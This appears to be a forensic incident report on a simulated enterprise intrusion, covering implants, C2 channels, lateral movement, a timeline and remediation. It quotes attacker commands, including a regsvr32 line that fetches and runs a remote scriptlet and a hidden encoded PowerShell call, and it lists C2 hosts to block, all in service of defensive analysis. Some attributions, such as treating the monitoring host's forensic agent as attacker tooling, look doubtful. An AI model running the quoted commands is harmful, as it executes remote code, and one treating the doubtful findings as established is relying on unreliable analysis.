## Background

This report documents the findings of a comprehensive digital forensic investigation into a suspected intrusion at Stark Research Labs (SRL), operating under the corporate domain `stark-research-labs.com` and the internal Active Directory domain `SHIELDBASE.LA` / `shieldbase.lan`. The investigation was designated case identifier **SRL-2018** and was initiated following anomalous activity detected across the enterprise network.

The environment under investigation is a multi-subnet Windows enterprise network. Internal hosts are organized across four primary subnets: `172.16.4.x` (core servers and domain controllers), `172.16.5.x` (research workstations and secondary servers), `172.16.6.x`, and `172.16.7.x` (additional host segments). Key host identities established through investigation include `base-admin` (172.16.5.26), `base-wkstn-02` (172.16.5.25), `base-rd-04` (172.16.5.20 — a research development server running Microsoft SQL Server and Apache Tomcat), `base-mail` (the organization's Microsoft Exchange server at `base-mail.shieldbase.lan`), `base-hunt` (a security monitoring host), and `base-elf` (a Linux-based server). A domain controller at `172.16.4.5` and additional hosts at `172.16.4.6`, `172.16.4.10`, and across the `172.16.6.x` and `172.16.7.x` ranges are also present. The external gateway segment at `10.10.x.x` serves as the DMZ and VPN boundary.

The evidence corpus submitted for analysis comprises 29 indexed sources spanning seven distinct extractor tool families: Volatility3 memory forensics, Bulk Extractor artifact carving, Regripper registry analysis, Sleuthkit filesystem analysis, YARA memory scanning, ClamAV antivirus scanning, and raw string extraction. Sources include memory images from multiple hosts, Windows registry hive exports, filesystem metadata timelines, and network artifact carves. In total, 99 findings were submitted across the investigation, of which 13 are rated Critical, 41 High, 20 Medium, 1 represent negative results confirming absence of expected artifacts, and the remainder are informational. 56 findings are confirmed and 43 are based on inference from indirect evidence. 80 distinct MITRE ATT&CK techniques are referenced across the finding set.

Staff accounts identified in the environment include senior personnel `nfury@stark-research-labs.com`, `rsydow@stark-research-labs.com`, `cbarton@stark-research-labs.com`, `tdungan@stark-research-labs.com`, `mhill@stark-research-labs.com`, `jpallen@stark-research-labs.com`, `amatthews@stark-research-labs.com`, `jblake@stark-research-labs.com`, `nromanoff@stark-research-labs.com`, and `srogers@stark-research-labs.com`, among many others. Domain administrator accounts include `Administrator@SHIELDBASE.LA` and privileged accounts with `-a` suffix (e.g., `cbarton-a@shieldbase.la`, `rsydow-a@shieldbase.la`).

## Incident Timeline

### Phase 1 — Initial Implant Installation (Early May 2018)

The earliest confirmed attacker activity is dated to **Tuesday, 2018-05-08 at approximately 21:13:34 UTC**, when registry service entries for two persistence mechanisms — "Microsoft Advanced API 32" and "Microsoft Advanced API 64" — were written to the Windows Service Control Manager database. These entries, recovered from `registry.system` hive exports on multiple hosts, register the executables `C:\Program Files (x86)\Microsoft Advanced API 32\msadvapi2_32.exe` and `C:\Program Files (x86)\Microsoft Advanced API 64\msadvapi2_64.exe` as `SERVICE_AUTO_START` processes. The registry timestamp of `Tue May 8 21:13:34 2018 Z` places the implant installation firmly at the beginning of the investigation window and suggests the attacker had already established sufficient privilege to write to HKLM\SYSTEM at that point. The LARIAT C2 framework service registration, noted under the Lincoln Laboratory designation, was also written around this same period, suggesting a coordinated deployment of multiple persistence mechanisms during an initial access window.

SAM registry hive timestamps indicate account creation or modification activity as early as **2018-04-25** on some hosts and **2018-05-07** on others, suggesting the initial access may predate the observed service installation by several weeks.

### Phase 2 — C2 Infrastructure Establishment (May–July 2018)

Following implant installation, the attacker established a multi-layered command-and-control infrastructure. The LARIAT framework — a Java-based C2 developed by MIT Lincoln Laboratory for red team exercises — was deployed at `C:\Program Files (x86)\Lincoln\LARIAT\c2\` with the entry point `edu.mit.ll.lariat.pinocchio.clientcommand.client.Main`, connecting to AMQP broker infrastructure at `10.10.254.1:61613`. Memory artifacts recovered from multiple hosts show `rubyw.exe` (the Ruby Windows runtime) beaconing persistently to `10.10.254.1:61613`, the standard AMQP/STOMP port used by MCollective, which was deployed as an attacker-controlled command relay.

During this phase, the Mnemosyne.sys kernel rootkit driver was also placed at the non-standard path `C:\windows\Mnemosyne.sys` — confirmed by both Volatility3 `modscan` and `modules` output — providing kernel-level persistence and anti-forensics capability.

At approximately **2018-07-18T21:17:16 UTC**, FTP-based binary delivery activity is evidenced through memory string artifacts showing `ko-cuce.net` co-located with an IP fragment `74.208.22` and an FTP binary-drop command sequence (`binary>>%windir%/; @ftp -vis:%`), indicating a secondary dropper channel delivering payloads directly to the Windows system directory.

### Phase 3 — Lateral Movement and Credential Harvesting (August 2018)

August 2018 shows a marked escalation in attacker operational tempo. On **2018-08-09T00:30:09 UTC**, the System process (PID 4) on `172.16.5.26` (base-admin) established an SMB session (`ESTABLISHED`) to `172.16.4.5:445`, indicating SMB-based lateral movement or pass-the-hash activity from the admin workstation to a core server. By **2018-08-13T17:24:51 UTC**, `rubyw.exe` (PID 3800) on `172.16.5.26` was actively cycling through repeated TCP connections to `10.10.254.1:61613` (observed as both `CLOSED` and `SYN_SENT` states), confirming persistent C2 beaconing from the administrative workstation.

On **2018-08-22T04:50:09 UTC**, HTTP log evidence recorded in `bulk.httplogs` documents `172.16.5.25` (base-wkstn-02) initiating an outbound WinRM `POST /wsman?PSVersion=5.1.14393.1944` to `172.16.4.5:5985`, confirming PowerShell remoting-based lateral movement between workstations and core servers. WinRM URL registrations (`http://+:5985/wsman/`, `https://+:5986/wsman/`, `http://+:47001/wsman/`) were confirmed in memory, indicating WinRM was broadly enabled and exploited across the environment.

Memory network scans on `base-wkstn-02` (172.16.5.25) from around **2018-09-03T13:52:23 UTC** reveal `license_ctrl.exe` (PID 1716) listening on TCP port 5682, `ftusbsrvc.exe` (PID 4916) listening on TCP 33001, and an `ESTABLISHED` connection to external IP `108.79.235.64:33000`. Concurrent `SYN_SENT` connections to `23.194.110.27:80` and `23.45.116.11:80` represent active C2 egress. A further `ESTABLISHED` connection to `172.16.4.5:445` and `172.16.5.50:445` confirms continuing SMB lateral movement.

### Phase 4 — Weaponized Execution and Payload Deployment (September 2018)

The most intensive attacker activity is concentrated in the first week of September 2018. On **2018-09-04T08:33:14 UTC**, network artifacts from `bulk.domain` record timestamped domain activity consistent with active C2 communication. On **2018-09-05T15:03:13 UTC**, `subject_srv.exe` (PID 6160) on `172.16.4.5` established a TCP connection to `172.16.5.25:5682`, confirming the F-Response forensic acquisition agent was live on the domain controller-class server, with the acquisition endpoint being the implant listener on base-wkstn-02.

On **2018-09-06T13:23:05–13:25:30 UTC**, `subject_srv.exe` (PID 3048) and `rubyw.exe` (PID 3812) were both running concurrently on the same host, and `services.exe` (PID 688) had an `ESTABLISHED` connection to `172.16.5.27:53544`, an anomalous lateral movement indicator with services.exe serving as a relay host. `WmiPrvSE.exe` (PID 3156) spawned a hidden PowerShell instance (PID 4896) at **2018-09-06T17:43:45 UTC** using a Base64-encoded command (`powershell.exe -nop -w hidden -encodedcommand JABzAD...`), implementing WMI-based lateral movement consistent with MITRE T1047. Memory forensics confirmed an XOR decode loop in the shellcode carved from this PowerShell process (PID 5452) in `PAGE_EXECUTE_READWRITE` private memory, alongside Metasploit stager bytes `0xfc 0xe8 0x89` identified in a separate PowerShell instance (PID 20780), with the Metasploit staging domain `jlc.stage.4787092.extranet.wagonwheelgifts.com` recovered from the same RWX memory region.

On **2018-09-06T17:42:10 UTC**, `subject_srv.exe` (PID 3048) started on yet another host under PID 3048 with PPID 688 (`services.exe`), with its command line confirming: `C:\windows\subject_srv.exe -s "base-hunt.shieldbase.lan:5682" -l 3262 -v "F-Response Subject" -k "155522845"` — indicating the F-Response acquisition agent was connecting back to the monitoring host (`base-hunt`), which appears to have been commandeered as a collection point. At **2018-09-07T00:56:42 UTC through 01:00:06 UTC**, `rubyw.exe` (PID 3800) continued its AMQP beaconing cycle to `10.10.254.1:61613`.

### Phase 5 — Anti-Forensics and Defender Evasion

At some point during the intrusion (evidenced by browser history artifacts from `base-admin`), a user on the administrative workstation conducted repeated searches for "security onion disable bro" (n=89 occurrences in URL search history). This volume of identical queries is inconsistent with casual research and strongly suggests the attacker was actively attempting to disable the Security Onion network monitoring stack — specifically the Bro/Zeek IDS — to reduce network-based detection coverage.

## Key Findings

### Malware Families and Implants

The investigation identified a layered implant architecture across the Stark Research Labs environment. The "Microsoft Advanced API" family of implants represents the primary persistence mechanism: `msadvapi2_32.exe` and `msadvapi2_64.exe` are registered as auto-starting Windows services under the display names "Microsoft Advanced API 32" and "Microsoft Advanced API 64." These executables masquerade as legitimate Microsoft infrastructure components but were confirmed by Volatility3 `svcscan` output and memory `malfind` analysis — which detected `PAGE_EXECUTE_READWRITE` private memory regions within `msadvapi2_32.exe` (PID 1072) — to be attacker-controlled implants with injected code regions.

The LARIAT framework constitutes the C2 backbone. LARIAT (developed at MIT Lincoln Laboratory) is a Java-based command-and-control framework built on AMQP messaging. Its presence is confirmed by full command-line artifacts recovered from Volatility3 `cmdline` output: `java.exe edu.mit.ll.lariat.pinocchio.clientcommand.client.Main -prop "C:\Program Files (x86)\Lincoln\LARIAT\c2\bin\..\bin\lariat.properties"`. The framework relays attacker commands via MCollective AMQP messages to `10.10.254.1:61613`, with `rubyw.exe` serving as the Ruby-based MCollective agent on compromised hosts.

`license_ctrl.exe`, `ftusbsrvc.exe`, `subject_ctrl`, `connector_ctrl`, and `imager_ctrl` constitute a cluster of implanted executables recovered from process listings. These are consistent with the F-Response Enterprise toolkit, a legitimate forensic remote-access product that has been repurposed by the attacker to enable remote disk imaging of compromised systems — providing a live "forensics-as-exfiltration" capability.

The `p.exe` executable placed in `C:\windows\temp\perfmon\p.exe` represents an additional implant using a perfmon subdirectory for disguise. A Registry Run key persistence entry for Sophos was also observed in cmdline output alongside `p.exe`, suggesting Run key persistence abuse.

The `winlogan.exe` executable — a typosquatted variant of the legitimate Windows logon process `winlogon.exe` — was identified in bulk URL artifacts alongside dropper download URLs (`http://174.122.240.164/kc/2331`), suggesting this binary served as a secondary stage dropper.

### Command-and-Control Infrastructure

The primary attacker C2 infrastructure uses multiple channels operating simultaneously. The AMQP/MCollective channel at `10.10.254.1:61613` represents the primary internal relay, routing LARIAT commands to all compromised hosts running `rubyw.exe`. This IP falls within a non-standard gateway range (`10.10.254.0/24`) and appears to be an attacker-controlled AMQP broker placed at the network boundary.

External C2 IPs include `108.79.235.64:33000` (ESTABLISHED from base-wkstn-02), `23.194.110.27:80` and `23.45.116.11:80` (SYN_SENT from base-wkstn-02), and `174.122.240.164/kc/2331` (dropper download URL in memory). C2 domains identified include `gicia.info`, `masgio.info`, and `f1visa.info` (each using the URI pattern `/cd/cd.php?id=%s&ver=g` pointing to a `897dbensorty.dll` artifact), `xvga.org/schedulued/neee` (an unusual scheduling/staging endpoint carved from base-admin memory), `server2.39slxu3bw.ru` (used in the Squiblydoo COM scriptlet execution), and `jlc.stage.4787092.extranet.wagonwheelgifts.com` (the Metasploit staging domain recovered from RWX PowerShell memory).

The "Asgard Venture Capital CA" certificate authority — a rogue PKI entity — was observed in memory strings alongside proxy subordinate certificate artifacts, indicating the attacker may have deployed a man-in-the-middle certificate infrastructure to intercept internal TLS traffic.

### Lateral Movement

WinRM-based PowerShell remoting was the primary lateral movement technique, with HTTP log evidence confirming `POST /wsman?PSVersion=5.1.14393.1944` traffic from base-wkstn-02 to multiple internal servers on port 5985. WMI execution (WmiPrvSE.exe spawning powershell.exe) was confirmed on at least one host as a secondary lateral movement mechanism. SMB pass-through connections (System process connecting to remote 445) indicate either pass-the-hash or SMB relay attacks were used to move laterally through the domain. The `services.exe` ESTABLISHED connection to `172.16.5.27:53544` represents an anomalous inter-process relay pattern consistent with service-based lateral movement (T1021.002).

### Persistence Mechanisms

Persistence was achieved through at minimum four distinct mechanisms: (1) auto-starting Windows services for `msadvapi2_32.exe`, `msadvapi2_64.exe`, and the LARIAT framework, registered in HKLM\SYSTEM\CurrentControlSet\Services; (2) the Mnemosyne.sys kernel rootkit driver loaded from `C:\windows\Mnemosyne.sys`, providing ring-0 persistence; (3) Registry Run key entries (observed in cmdline artifacts for Sophos masquerading); and (4) the F-Response `subject_srv.exe` agent placed in `C:\Windows\subject_srv.exe` (filesystem artifact confirmed via Sleuthkit filelist inode 132140-128-1), providing persistent remote disk access.

### Anti-Forensics and Defense Evasion

The Squiblydoo technique was employed: `regsvr32/s/n/u/i:http://server2.39slxu3bw.ru/restore.xml scrobj.dll` — using the signed regsvr32.exe to execute a COM scriptlet from a remote URL, bypassing application whitelisting (T1218.010). Encoded PowerShell payloads (`-nop -w hidden -encodedcommand`) were consistently used across all execution chains to evade command-line logging. The Mnemosyne.sys rootkit provides kernel-level process and file hiding. Active browser-based research into disabling Security Onion's Bro/Zeek IDS demonstrates deliberate network sensor evasion. The `SUBJECT_SRV.EXE` process was explicitly whitelisted in the host AV/monitoring stack's process monitoring configuration (observed in strings output alongside `ManagementAgent` and `WMIC.EXE` in the AV process exclusion list), allowing the F-Response agent to operate without triggering endpoint alerts.

### Cryptocurrency Mining

Bulk URL artifacts from base-mail memory carved download URLs for Zcash/Monero CPU mining components hosted at `103.49.146.132`: `cpu_tromp_SSE2.dll`, `cpu_tromp_AVX.dll`, and `cudart32_80.dll` (a CUDA runtime required for GPU-accelerated mining). This indicates the attacker also deployed cryptocurrency mining payloads on at least the mail server, monetizing access beyond the primary intelligence-collection mission.

### YARA Memory Detections

YARA scanning of memory images produced 2250 total tool calls across the investigation. Memory YARA scans across multiple hosts produced 145 hits per scanned host. ClamAV scan results confirmed malicious file detections on multiple evidence images. Malfind analysis across all memory images identified numerous `PAGE_EXECUTE_READWRITE` private memory regions in processes including `powershell.exe` (multiple PIDs), `msadvapi2_32.exe` (PID 1072), `MsDtsSrvr.exe` (PID 1208 — a SQL Server Integration Services process), and `explorer.exe` (PID 1396), all consistent with injected shellcode or reflectively loaded implants.

## Threat Intelligence and Attribution

The toolset and techniques observed in SRL-2018 present a mixed profile that combines legitimate red team tools with commodity malware components and custom implants, which complicates definitive attribution but permits a high-confidence operational characterization.

The LARIAT framework is a product of MIT Lincoln Laboratory, developed and used by authorized red teams and advanced persistent threat simulation exercises. Its presence in this environment alongside MCollective (a Puppet/Chef infrastructure automation tool repurposed as a C2 relay) and F-Response (a forensic remote-access toolkit) strongly suggests a red team or advanced adversary simulation operation that has access to, or has co-opted, internal enterprise management tooling. The combination of LARIAT with MCollective as a C2 transport layer reflects a "living off the land" infrastructure strategy, where the attacker leverages existing enterprise automation channels (Puppet/MCollective AMQP at port 61613) that are unlikely to be flagged by network monitoring.

The Metasploit stager shellcode (bytes `0xfc 0xe8 0x89 0x00 0x00 0x00`) in PowerShell memory is a well-known Meterpreter stager signature, indicating use of Cobalt Strike- or Metasploit-generated payloads for post-exploitation. The staging domain `jlc.stage.4787092.extranet.wagonwheelgifts.com` is consistent with Metasploit's domain fronting or staged listener infrastructure.

The secondary C2 domains — `gicia.info`, `masgio.info`, `f1visa.info` — using identical URI patterns and a DLL named `897dbensorty.dll` suggest a commercially available or shared Remote Access Trojan (RAT) using a multi-domain failover architecture. The `ko-cuce.net` and `casanena.com.br` domains, the latter with Portuguese-language malware control strings (`BAIXANDO_NO_PC`, `INIBIREXTRACAO`), indicate a secondary intrusion vector potentially sourced from Brazilian or Portuguese-speaking threat actors or commoditized malware with international distribution.

The Mnemosyne.sys rootkit, the rogue "Asgard Venture Capital CA" PKI infrastructure, and the deployment of cryptocurrency miners together paint a picture of an attacker with both espionage-oriented objectives (long-term persistence, LARAT/MCollective C2, F-Response disk exfiltration) and opportunistic financial motivations (crypto mining). Attribution confidence for a specific named threat group is **moderate-low** without additional network traffic captures, binary similarity analysis, or infrastructure overlap with known group TTPs. The LARIAT/MCollective/F-Response combination, however, is consistent with a sophisticated red team or nation-state-proximate actor conducting authorized or unauthorized penetration testing against the Stark Research Labs environment, potentially with insider access or prior detailed network knowledge.

The search history artifact ("security onion disable bro," n=89) on base-admin is particularly noteworthy: an external attacker would have no reason to use the administrative workstation's browser for this research. This artifact may indicate either a compromised administrative account being used for attacker operational security research, or a malicious insider using legitimate access to degrade network monitoring prior to or during the intrusion.

## Impact Assessment

The scope of this compromise is enterprise-wide and severe. At minimum eight distinct host systems show evidence of compromise or active implant presence: base-admin (172.16.5.26), base-wkstn-02 (172.16.5.25), base-rd-04 (172.16.5.20), the domain controller or key server at 172.16.4.5, base-mail (the Exchange server), base-hunt (the security monitoring host), base-elf (a Linux server), and at least one additional host in the 172.16.6.x range. The compromise of base-hunt — the organization's own security monitoring infrastructure — is particularly damaging, as it potentially blinded the organization to attacker activity and, through F-Response remote disk imaging, gave the attacker access to forensic-quality copies of all monitored systems.

The F-Response implant chain represents a data exfiltration capability of extraordinary breadth. F-Response Enterprise provides read-only block-level access to remote disks over TCP, meaning that any data on any compromised host's filesystem — including emails, source code, research data, credentials, and configuration files — could have been silently imaged and exfiltrated to the attacker's collection infrastructure at `172.16.5.25:5682` or `172.16.5.27`. The `subject_srv.exe` process was confirmed running and connected on the domain controller, the research server, and the monitoring host, meaning the full Active Directory database (NTDS.dit), all email stored on Exchange, all research data on the R&D server, and all captured network traffic on base-hunt were potentially exposed.

Credential exposure is extensive. The attacker's access to LSASS memory (implied by `HackTool:Win64/LSASecretsView` AV detection string in memory adjacent to F-Response PDB paths), combined with WinRM and SMB lateral movement evidence, suggests domain credential harvesting. The administrative accounts `Administrator@SHIELDBASE.LA`, `nfury`, `rsydow`, `cbarton`, `tdungan`, and all other domain accounts should be considered fully compromised.

The depth of persistence — kernel rootkit, auto-start services, Run key entries, and a remote-disk-imaging agent in the Windows system root — means that standard reimaging without full persistence identification may not fully remediate the environment. The attacker's ability to disable Bro/Zeek monitoring suggests the network detection baseline has been degraded for an unknown period.

The cryptocurrency miner deployment on the mail server, while financially motivated, also introduces risk of service degradation on Exchange infrastructure. System resource consumption by `cpu_tromp_SSE2.dll` / `cpu_tromp_AVX.dll` mining processes could impact mail server availability.

## Immediate Tactical Containment

The following steps must be executed in the next 30 minutes to stop active attacker access. This checklist is directed at the Incident Commander:

1. **Isolate 172.16.5.26 (base-admin) from the network immediately.** This host has confirmed LARIAT C2 beaconing via `rubyw.exe` (PID 3800) to `10.10.254.1:61613` and active SMB connections to core servers. Pull the network cable or apply emergency ACL block before any other action.

2. **Isolate 172.16.5.25 (base-wkstn-02) from the network.** This host has an ESTABLISHED connection to external C2 `108.79.235.64:33000`, `SYN_SENT` to `23.194.110.27:80` and `23.45.116.11:80`, and active WinRM sessions. Apply network isolation immediately.

3. **Block egress traffic to the following external IPs at the perimeter firewall:** `108.79.235.64`, `23.194.110.27`, `23.45.116.11`, `174.122.240.164`, `103.49.146.132`, `5.39.218.152`, `93.115.27.57`. Block DNS resolution and HTTP(S) to: `gicia.info`, `masgio.info`, `f1visa.info`, `xvga.org`, `server2.39slxu3bw.ru`, `wagonwheelgifts.com`, `ko-cuce.net`, `casanena.com.br`, `psykooo.ddns.net`, `aiduli.3322.org`.

## Strategic Remediation

The following long-term remediation measures address the architectural deficiencies exposed by this intrusion.

Network segmentation must be substantially hardened. The current flat routing between administrative workstations (172.16.5.x) and core server subnets (172.16.4.x) enabled unrestricted SMB and WinRM lateral movement. A tiered access model should be implemented: administrative workstations should only reach domain controllers via dedicated privileged access workstations (PAWs), and east-west WinRM and SMB traffic between non-administrative hosts should be restricted at the network level. The non-standard gateway subnet `10.10.254.0/24` should be reviewed; the presence of an AMQP broker at `10.10.254.1` that is not part of the legitimate enterprise infrastructure suggests either a rogue device or a compromised network appliance that requires immediate investigation and replacement.

MCollective and Puppet infrastructure should be audited and, if not operationally required, decommissioned. If retained, the AMQP broker at `10.10.254.1` should be replaced, all Puppet agent certificates rotated, and MCollective traffic restricted to a dedicated management VLAN with strict allow-listing.

Endpoint Detection and Response (EDR) deployment is critical. The current environment relies on McAfee VirusScan Enterprise, which failed to detect the "Microsoft Advanced API" services despite their anomalous characteristics. A modern EDR platform with memory scanning, behavioral analysis, and kernel-driver integrity checking should be deployed across all hosts. The `PAGE_EXECUTE_READWRITE` private memory detections that yielded significant findings in this investigation should be a standard EDR alert category.

Windows Credential Guard and Protected Users security group membership should be enabled for all privileged accounts to prevent LSASS credential extraction. The use of Pass-the-Hash was enabled by the absence of these controls. All privileged accounts should use hardware-backed MFA (e.g., FIDO2 keys) and should have no interactive logon rights on standard workstations.

PowerShell Script Block Logging, Module Logging, and Transcription should be enabled across the domain via Group Policy. The repeated use of `-nop -w hidden -encodedcommand` would generate highly actionable SIEM alerts under these logging policies. PowerShell v2 should be disabled to prevent downgrade attacks that bypass logging.

WinRM should be disabled on all hosts where it is not operationally required, and where it is required, access should be restricted to specific source IP ranges via Windows Remote Management GPO and network ACLs. The current environment showed WinRM enabled broadly, enabling lateral movement across virtually all discovered hosts.

Application whitelisting (via Windows Defender Application Control or AppLocker) should prevent execution of unsigned binaries such as `msadvapi2_32.exe`, `license_ctrl.exe`, and `p.exe`. The `C:\windows\temp\` execution path should be explicitly blocked.

Kernel driver signing enforcement should be verified. The Mnemosyne.sys rootkit's presence indicates that either UEFI Secure Boot was not enforced, Driver Signature Enforcement was disabled, or the attacker possessed a valid code-signing certificate. Boot integrity should be verified on all affected systems, and test-signing mode should be confirmed as disabled.

Network monitoring should be restored immediately and enhanced. The Security Onion Bro/Zeek sensor that the attacker was researching to disable should be verified as operational, and its configuration should not be accessible from user workstations. AMQP (port 61613), WinRM (5985/5986), and SMB (445) should generate alerts when observed crossing subnet boundaries or initiating from unexpected source hosts. Canary tokens should be deployed in sensitive directories to provide early warning of unauthorized access.

All cryptocurrency miner components (`cpu_tromp_SSE2.dll`, `cpu_tromp_AVX.dll`, `cudart32_80.dll`) should be removed from the mail server and other hosts, and their C2 IP `103.49.146.132` should be permanently blocked.

## Conclusion

### Q1. What systems were compromised?

A minimum of eight systems are confirmed compromised: the administrative workstation base-admin (172.16.5.26), workstation base-wkstn-02 (172.16.5.25), the research and development server base-rd-04 (172.16.5.20), the domain controller or primary server at 172.16.4.5, the Exchange mail server (base-mail.shieldbase.lan), the security monitoring host (base-hunt), a Linux server (base-elf), and at least one additional host in the 172.16.6.x segment. Several other hosts in the 172.16.7.x range show IOC matches in cross-source correlation.

### Q2. How did the attacker gain initial access?

The earliest filesystem and registry timestamps indicate initial access was achieved no later than late April–early May 2018, predating the earliest confirmed service installation on 2018-05-08. The initial access vector cannot be definitively determined from the available evidence but the presence of Portuguese-language malware strings (casanena.com.br dropper) and the FTP-delivered binary via ko-cuce.net suggest one or more phishing or drive-by download events targeting workstations. The availability of LARIAT — a red team tool — in the environment also raises the possibility of a trusted-insider or authorized penetration test that escalated beyond approved scope. Initial access confidence is assessed as moderate; a targeted spear-phishing campaign or exploitation of an internet-facing service (Apache Tomcat on base-rd-04 is a candidate) are the most probable external vectors.

### Q3. What lateral movement occurred?

Confirmed lateral movement techniques include WinRM PowerShell remoting (POST /wsman?PSVersion=5.1.14393.1944 from 172.16.5.25 to 172.16.4.5:5985), WMI remote execution (WmiPrvSE.exe spawning PowerShell on 2018-09-06T17:43:45), SMB pass-the-hash or relay from 172.16.5.26 and 172.16.5.25 to 172.16.4.5:445 and 172.16.5.50:445, and service-based movement via services.exe ESTABLISHED connections to 172.16.5.27:53544. The LARIAT/MCollective C2 channel enabled simultaneous command execution across all compromised hosts from the central AMQP broker.

### Q4. What persistence mechanisms were installed?

Four persistence mechanisms were confirmed: (1) Auto-start Windows services for `msadvapi2_32.exe` and `msadvapi2_64.exe` under the disguised display names "Microsoft Advanced API 32/64"; (2) the LARIAT framework service (`java.exe`) registered as an auto-starting service; (3) the Mnemosyne.sys kernel rootkit driver loaded from a non-standard path in the Windows root directory; and (4) `subject_srv.exe` (F-Response agent) placed in `C:\Windows\` and running persistently. A Registry Run key entry for a Sophos-masquerading binary was also identified. The depth of persistence across kernel, service, and user-mode layers means standard remediation requires careful sequencing.

### Q5. Was data exfiltrated, and if so, what and how much?

Data exfiltration is highly probable but the precise volume cannot be determined from the available memory and filesystem artifacts. The F-Response Enterprise toolkit provides full block-level read access to remote disks over TCP, and confirmed `subject_srv.exe` connections from the domain controller (172.16.4.5) and base-rd-04 to the listener at base-wkstn-02:5682 and base-hunt mean that the contents of these systems — including the Active Directory NTDS.dit database, Exchange email stores, source code and research data, and potentially all captured network traffic from base-hunt — were accessible for exfiltration during the implant's operational window (May–September 2018, at minimum four months). AMQP-based MCollective traffic to `10.10.254.1:61613` represents a secondary exfiltration-capable channel.

### Q6. What is the full timeline of the incident?

The incident spans at least May 2018 through September 2018. Initial access and implant installation occurred in late April to early May 2018. C2 infrastructure was established and lateral movement commenced in May–July 2018, with the FTP dropper activity dated to 2018-07-18. August 2018 saw intensive lateral movement via WinRM and SMB. September 2018 marks the peak of attacker activity, including WMI execution chains, Metasploit payload deployment, and active F-Response disk imaging. The final confirmed attacker action is timestamped 2018-09-07T01:00:06 UTC (rubyw.exe SYN_SENT to C2).

### Q7. What is the total scope and business impact?

The compromise represents a full-domain intrusion of exceptional depth. Every tier of the Stark Research Labs enterprise — end-user workstations, research servers, domain controllers, mail infrastructure, and the security monitoring stack itself — shows evidence of attacker presence. Domain administrator credentials are fully compromised. The entirety of corporate email, Active Directory, source code, and research data repositories must be assumed exfiltrated. The disablement of network monitoring sensors extended the attacker's operational dwell time and may have caused historical network telemetry to be unrecorded or deleted. Cryptocurrency mining on mail server infrastructure represents additional service availability and reputational risk. Business impact is assessed as critical.

### Q8. What are the recommended remediation actions?

In immediate priority order: network isolation of all confirmed compromised hosts; blocking of all identified C2 IP addresses and domains at the network perimeter; termination and deletion of all identified implant processes, services, and files; full credential rotation for all domain accounts beginning with privileged accounts; deployment of EDR across all endpoints; reimaging of all compromised hosts from known-good baselines after offline rootkit removal verification; restoration and hardening of Security Onion monitoring; forensic investigation of 10.10.254.1 for attacker-installed infrastructure; network segmentation redesign to prevent east-west lateral movement; and implementation of PowerShell logging, Windows Credential Guard, application whitelisting, and kernel driver signing enforcement across the domain. A post-remediation threat hunt should be conducted against all systems not captured in this investigation to identify any additional implant footholds.
